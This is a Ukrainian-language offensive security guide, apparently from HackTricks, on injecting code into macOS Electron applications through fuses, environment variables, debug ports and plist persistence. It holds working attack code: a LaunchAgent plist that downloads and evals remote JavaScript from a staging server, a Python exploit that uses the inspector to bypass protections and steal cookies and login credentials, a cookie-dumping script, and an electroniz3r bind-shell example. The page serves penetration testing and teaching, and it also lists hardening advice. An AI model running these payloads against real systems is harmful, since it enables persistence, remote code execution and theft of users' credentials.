# Ін’єкція в Electron-застосунки macOS

{{#include ../../../banners/hacktricks-training.md}}

## Основна інформація

Якщо ви не знаєте, що таке Electron, тут можна знайти [**багато інформації**](https://book.hacktricks.wiki/en/desktop-application-security/electron-desktop-apps/index.html#rce-xss--contextisolation). А поки просто знайте, що Electron запускає **node**.\
А в node є деякі **параметри** та **змінні середовища**, які можна використовувати, щоб **змусити його виконати інший код**, окрім коду в указаному файлі.

Про передумову локального запису для різних платформ, а також шляхи ASAR/V8 snapshot див. [Electron local code injection and snapshot tampering](../../../desktop-application-security/electron-desktop-apps/electron-local-code-injection-and-snapshot-tampering.md).

### Electron Fuses

Ці техніки розглянемо далі, але останнім часом Electron додав кілька **прапорців безпеки, щоб запобігти їм**. Це [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), і ось ті, що використовуються, щоб **запобігти** завантаженню Electron-застосунками в macOS **довільного коду**:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Якщо вимкнено, це запобігає використанню змінної середовища **`ELECTRON_RUN_AS_NODE`** для ін’єкції коду.
- **`EnableNodeCliInspectArguments`**: Якщо вимкнено, такі параметри, як `--inspect` і `--inspect-brk`, не застосовуються. Це запобігає ін’єкції коду в такий спосіб.
- **`EnableEmbeddedAsarIntegrityValidation`**: Якщо ввімкнено, завантажений **файл** **`asar`** буде **перевірено** macOS. Це **запобігає** **ін’єкції коду** шляхом зміни вмісту цього файлу.
- **`OnlyLoadAppFromAsar`**: Якщо ввімкнено, замість пошуку застосунку для завантаження в такому порядку: **`app.asar`**, **`app`** і, нарешті, **`default_app.asar`**, Electron перевірятиме та використовуватиме лише app.asar. Це гарантує, що в поєднанні з fuse **`embeddedAsarIntegrityValidation`** буде **неможливо** **завантажити неперевірений код**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Якщо ввімкнено, процес браузера використовує для V8 snapshot файл `browser_v8_context_snapshot.bin`.

Ще один цікавий fuse, який не запобігає ін’єкції коду:

- **EnableCookieEncryption**: Якщо ввімкнено, файли cookie на диску шифруються криптографічними ключами на рівні ОС.

### Перевірка Electron Fuses

Ці **прапорці** можна **перевірити** в застосунку за допомогою:

```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
  RunAsNode is Disabled
  EnableCookieEncryption is Enabled
  EnableNodeOptionsEnvironmentVariable is Disabled
  EnableNodeCliInspectArguments is Disabled
  EnableEmbeddedAsarIntegrityValidation is Enabled
  OnlyLoadAppFromAsar is Enabled
  LoadBrowserProcessSpecificV8Snapshot is Disabled
```

### Зміна Electron Fuses

Як [**зазначено в документації**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), конфігурація **Electron Fuses** зберігається у **бінарному файлі Electron**, який містить рядок **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.<sup>[[1]](#references)</sup>

У програмах macOS цей файл зазвичай розташований тут: `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`

```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```

Цей файл можна завантажити на [https://hexed.it/](https://hexed.it/) і знайти попередній рядок. Після нього в ASCII буде видно число «0» або «1», яке вказує, чи вимкнений або ввімкнений кожен fuse. Просто змініть hex-код (`0x30` — це `0`, а `0x31` — `1`), щоб **змінити значення fuse**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу: якщо спробувати **перезаписати** **бінарний файл `Electron Framework`** у застосунку цими зміненими байтами, застосунок не запуститься.

## RCE: додавання коду до застосунків Electron

Застосунок Electron може використовувати **зовнішні файли JS/HTML**, тож зловмисник може впровадити код у ці файли, підпис яких не перевірятиметься, і виконати довільний код у контексті застосунку.

> [!CAUTION]
> Однак наразі є 2 обмеження:
>
> - Для зміни застосунку потрібен дозвіл **`kTCCServiceSystemPolicyAppBundles`**, тому за замовчуванням це більше неможливо.
> - Скомпільований файл **`asap`** зазвичай має ввімкнені fuse **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`**.
>
> Це ускладнює (або унеможливлює) цей шлях атаки.

Зауважте, що вимогу щодо **`kTCCServiceSystemPolicyAppBundles`** можна обійти, скопіювавши застосунок до іншого каталогу (наприклад, **`/tmp`**), перейменувавши папку **`app.app/Contents`** на **`app.app/NotCon`**, **змінивши** файл **asar**, додавши до нього свій **шкідливий** код, повернувши назву папки до **`app.app/Contents`** і запустивши застосунок.<sup>[[5]](#references)</sup>

Розпакувати код із файлу asar можна командою:

```bash
npx asar extract app.asar app-decomp
```

І запакуйте його назад після внесення змін за допомогою:

```bash
npx asar pack app-decomp app-new.asar
```

## RCE за допомогою ELECTRON_RUN_AS_NODE

Згідно з [**документацією**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), якщо цю змінну середовища встановлено, процес запуститься як звичайний процес Node.js.<sup>[[6]](#references)</sup>

```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

> [!CAUTION]
> Якщо fuse **`RunAsNode`** вимкнено, змінну середовища **`ELECTRON_RUN_AS_NODE`** буде проігноровано, і це не спрацює.

### Ін'єкція через plist програми

Як [**запропоновано тут**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), можна зловживати цією змінною середовища у plist для забезпечення persistence:<sup>[[2]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
    </dict>
    <key>Label</key>
    <string>com.xpnsec.hideme</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>-e</string>
        <string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
```

## RCE with `NODE_OPTIONS`

Ви можете зберегти payload в окремому файлі та виконати його:

```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```

> [!CAUTION]
> Якщо fuse **`EnableNodeOptionsEnvironmentVariable`** **вимкнено**, програма **ігноруватиме** змінну середовища **NODE_OPTIONS** під час запуску, якщо не встановлено змінну середовища **`ELECTRON_RUN_AS_NODE`**. Її також буде **проігноровано**, якщо fuse **`RunAsNode`** вимкнено.
>
> Якщо не встановити **`ELECTRON_RUN_AS_NODE`**, ви побачите **помилку**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Ін’єкція через App Plist

Цією змінною середовища можна зловживати у plist для закріплення, додавши такі ключі:

```xml
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
           <key>NODE_OPTIONS</key>
           <string>--require /tmp/payload.js</string>
    </dict>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## RCE за допомогою inspect

Згідно з [**цим**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), якщо запустити Electron-застосунок із такими прапорцями, як **`--inspect`**, **`--inspect-brk`** та **`--remote-debugging-port`**, **порт налагодження буде відкрито**, тож до нього можна підключитися (наприклад, через Chrome на `chrome://inspect`) і **впровадити в нього код** або навіть запускати нові процеси.<sup>[[7]](#references)</sup>\
Наприклад:

```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

У [**цьому дописі в блозі**](https://hackerone.com/reports/1274695) цим налагодженням зловживають, щоб змусити headless chrome **завантажувати довільні файли в довільні місця**.<sup>[[8]](#references)</sup>

> [!TIP]
> Якщо застосунок має власний спосіб перевірки, чи задано змінні середовища або параметри на кшталт `--inspect`, спробуйте **обійти** цю перевірку під час виконання за допомогою аргументу `--inspect-brk`, який **зупинить виконання** на початку запуску застосунку й дасть змогу виконати обхід (наприклад, перезаписавши аргументи або змінні середовища поточного процесу).

Наведений нижче експлойт показував, що, відстежуючи застосунок і запускаючи його з параметром `--inspect-brk`, можна було обійти встановлений у ньому власний захист (видаливши `--inspect-brk` перезаписом параметрів процесу), а потім впровадити JS payload, щоб витягти cookies і облікові дані із застосунку:

```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
    const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

    fs.writeFile(filePath, data, (err) => {
        if (err) {
            console.error(`Error writing to file ${filePath}:`, err);
        } else {
            console.log(`File written successfully at ${filePath}`);
        }
    });
}

function get_cookies() {
    intervalIdCookies = setInterval(() => {
        console.log("Checking cookies...");
        wc.session.cookies.get({})
        .then((cookies) => {
            tokenCookie = cookies.find(cookie => cookie.name === "token");
            if (tokenCookie){
                writeToFile("/tmp/cookies.txt", cookies);
                clearInterval(intervalIdCookies);
                wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
            }
        })
    }, 1000);
}

function get_creds() {
    in_location = false;
    intervalIdCreds = setInterval(() => {
        if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
            in_location = true;
            console.log("Injecting creds logger...");
            wc.executeJavaScript(`
                (function() {
                    email = document.getElementById('login_email_id');
                    password = document.getElementById('login_password_id');
                    if (password && email) {
                        return email.value+":"+password.value;
                    }
                })();
            `).then(result => {
                writeToFile("/tmp/victim_credentials.txt", result);
            })
        }
        else if (in_location) {
            wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
            clearInterval(intervalIdCreds);
        }
    }, 10); // Check every 10ms
    setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
    """
    Fetch the local inspector's WebSocket URL from the JSON endpoint.
    Assumes there's exactly one debug target. 
    """
    global INSPECT_URL

    url = "http://127.0.0.1:9229/json"
    response = requests.get(url)
    data = response.json()
    if not data:
        raise RuntimeError("No debug targets found on port 9229.")
    # data[0] should contain an object with "webSocketDebuggerUrl"
    ws_url = data[0].get("webSocketDebuggerUrl")
    if not ws_url:
        raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
    INSPECT_URL = ws_url


async def monitor_victim():
    print("Monitoring victim process...")
    found = False
    while not found:
        sleep(1)  # Check every second
        for process in psutil.process_iter(attrs=['pid', 'name']):
            try:
                # Check if the process name contains "victim"
                if process.info['name'] and 'victim' in process.info['name']:
                    found = True
                    print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
                    os.kill(process.info['pid'], 9)  # Force kill the process
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                # Handle processes that might have terminated or are inaccessible
                pass
    os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
    global CONTEXT_ID, NAME, UNIQUE_ID
    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        
        sleep(1)

        await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

        await send_cmd(ws, "Profiler.enable")

        await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

        await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

        await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

        code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
        print("Injected code to bypass protections")


async def js_payloads():
    global CONT, CONTEXT_ID, NAME, UNIQUE_ID

    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
    await monitor_victim()
    sleep(3)
    await get_debugger_url()
    await bypass_protections()

    sleep(7)

    await js_payloads()
    


async def send_cmd(ws, method, get_first=False, params={}):
    """
    Send a command to the inspector and read until we get a response with matching "id".
    """
    global CONT

    CONT += 1

    # Send the command
    await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
    sleep(0.4)

    # Read messages until we get our command result
    while True:
        response = await ws.recv()
        data = json.loads(response)

        # Print for debugging
        print(f"[{method} / {CONT}] ->", data)

        if get_first:
            return data

        # If this message is a response to our command (by matching "id"), break
        if data.get("id") == CONT:
            return data

        # Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
    asyncio.run(main())
```

> [!CAUTION]
> Якщо fuse **`EnableNodeCliInspectArguments`** вимкнено, застосунок **ігноруватиме параметри node** (наприклад, `--inspect`) під час запуску, якщо не встановлено змінну середовища **`ELECTRON_RUN_AS_NODE`**. Вона також буде **проігнорована**, якщо fuse **`RunAsNode`** вимкнено.
>
> Однак усе ще можна використовувати **параметр Electron `--remote-debugging-port=9229`**, але попередній payload не спрацює для запуску інших процесів.

За допомогою параметра **`--remote-debugging-port=9222`** можна викрасти деяку інформацію із застосунку Electron, як-от **історію** (за допомогою GET-команд) або **cookies** браузера (вони **розшифровуються** всередині браузера, а отримати їх можна через **json endpoint**).

Дізнатися, як це зробити, можна [**тут**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) і [**тут**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f), а скористатися можна автоматизованим інструментом [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) або простим скриптом:<sup>[[9]](#references)[[10]](#references)</sup>

```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```



### Ін’єкція через App Plist

Можна зловживати цією змінною середовища у plist, щоб забезпечити persistence, додавши такі ключі:

```xml
<dict>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>--inspect</string>
    </array>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## Обхід TCC за допомогою старіших версій

> [!TIP]
> Демон TCC у macOS не перевіряє версію запущеної програми. Тож якщо ви **не можете впровадити код у програму Electron** за допомогою будь-якого з попередніх методів, можна завантажити попередню версію ПРОГРАМИ й впровадити код у неї, оскільки вона все ще матиме привілеї TCC (якщо цьому не перешкоджає Trust Cache).

## Запуск коду, відмінного від JS

Попередні методи дають змогу запускати **код JS у процесі програми Electron**. Однак пам’ятайте, що **дочірні процеси працюють у тому самому профілі sandbox, що й батьківська програма, та успадковують її дозволи TCC**.\
Тому, якщо ви хочете зловживати entitlements, щоб отримати доступ, наприклад, до камери чи мікрофона, можна просто **запустити інший бінарний файл із процесу**.

## Помітні вразливості Electron для macOS (2023–2024)

### CVE-2023-44402 – обхід перевірки цілісності ASAR

Electron ≤22.3.23 і різні попередні випуски версій 23–27 давали зловмиснику з доступом на запис до папки `.app/Contents/Resources` змогу обійти fuses `embeddedAsarIntegrityValidation` **і** `onlyLoadAppFromAsar`. Помилка полягала в *плутанині типів файлів* у засобі перевірки цілісності: через неї замість перевіреного архіву завантажувалася спеціально створена **папка з назвою `app.asar`**, тож будь-який JavaScript, розміщений у цій папці, виконувався під час запуску програми. Таким чином, уразливими залишалися навіть ті постачальники, які дотримувалися рекомендацій із посилення захисту та вмикали обидва fuses на macOS.<sup>[[3]](#references)</sup>

Виправлені версії Electron: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** і **27.0.0-alpha.7**. Зловмисники, які виявлять програму зі старішою збіркою, можуть замінити `Contents/Resources/app.asar` власною папкою, щоб виконувати код із entitlements TCC цієї програми.<sup>[[3]](#references)</sup> 

### Кластер CVE 2024 року: «RunAsNode» / «enableNodeCliInspectArguments»

У січні 2024 року низка CVE (CVE-2024-23738 — CVE-2024-23743) привернула увагу до того, що багато програм Electron постачаються з увімкненими fuses **RunAsNode** і **EnableNodeCliInspectArguments**. Тож локальний зловмисник може повторно запустити програму зі змінною середовища `ELECTRON_RUN_AS_NODE=1` або прапорцями на кшталт `--inspect-brk`, перетворивши її на *універсальний* процес Node.js, який успадкує всі дозволи sandbox і TCC програми.<sup>[[4]](#references)</sup>

Хоча команда Electron заперечувала оцінку «критична» й зазначала, що зловмиснику вже потрібне локальне виконання коду, ця проблема все одно корисна під час post-exploitation, оскільки перетворює будь-який уразливий пакет Electron на бінарний файл *living-off-the-land*, який може, наприклад, читати контакти, фотографії та інші конфіденційні дані, до яких раніше отримала доступ настільна програма.<sup>[[4]](#references)</sup>

Рекомендації щодо захисту від супроводжувачів Electron:<sup>[[4]](#references)</sup>

* Вимикайте fuses `RunAsNode` і `EnableNodeCliInspectArguments` у production-збірках.
* Якщо вашій програмі справді потрібен допоміжний процес Node.js, використовуйте новіший API **UtilityProcess**, а не вмикайте ці fuses знову. 

## Автоматичне впровадження

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Інструмент [**electroniz3r**](https://github.com/r3ggi/electroniz3r) можна легко використовувати, щоб **знаходити встановлені вразливі програми Electron** і впроваджувати в них код. Цей інструмент спробує використати метод **`--inspect`**:<sup>[[5]](#references)</sup>

Його потрібно скомпілювати самостійно. Використовувати його можна так:

```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```

- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki створено для встановлення backdoor в Electron-застосунки шляхом заміни JavaScript-файлів застосунків на JavaScript-файли Loki Command & Control.

## References

- [1] [Запобіжники Electron](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [Ін'єкція в macOS через сторонні фреймворки - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [Обхід цілісності ASAR через плутанину типів файлів (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Заява щодо CVE для 'runAsNode' - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - Забезпечення конфіденційності macOS за допомогою Electron - нова зброя у вашому арсеналі Red Team - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Змінні середовища | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Чому Electron-застосунки не можуть конфіденційно зберігати ваші секрети: параметр --inspect](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [Звіт HackerOne #1274695 - Зловживання налагодженням Electron для завантаження довільних файлів](https://hackerone.com/reports/1274695)
- [9] [Руки в банці з печивом: вилучення cookies через порт віддаленого налагоджувача Chromium - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Налагодження помилок вилучення cookies через віддалений налагоджувач Chromium - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
